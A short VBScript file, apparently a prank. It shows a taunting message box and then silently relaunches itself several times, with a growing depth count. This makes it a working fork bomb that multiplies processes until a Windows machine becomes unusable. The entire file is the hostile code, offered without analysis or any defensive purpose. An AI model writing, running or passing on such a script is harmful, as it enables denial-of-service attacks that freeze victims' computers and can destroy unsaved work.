Option Explicit

Dim shell, depth, i
Set shell = CreateObject("WScript.Shell")
If WScript.Arguments.Count > 0 Then
    depth = CInt(WScript.Arguments(0)) + 1
Else
    depth = 1
End If

MsgBox "you CAN't close me >:D", vbOKOnly, "lol"

For i = 1 To depth
    shell.Run "wscript.exe """ & WScript.ScriptFullName & """ " & depth, 0, False
Next

WScript.Quit
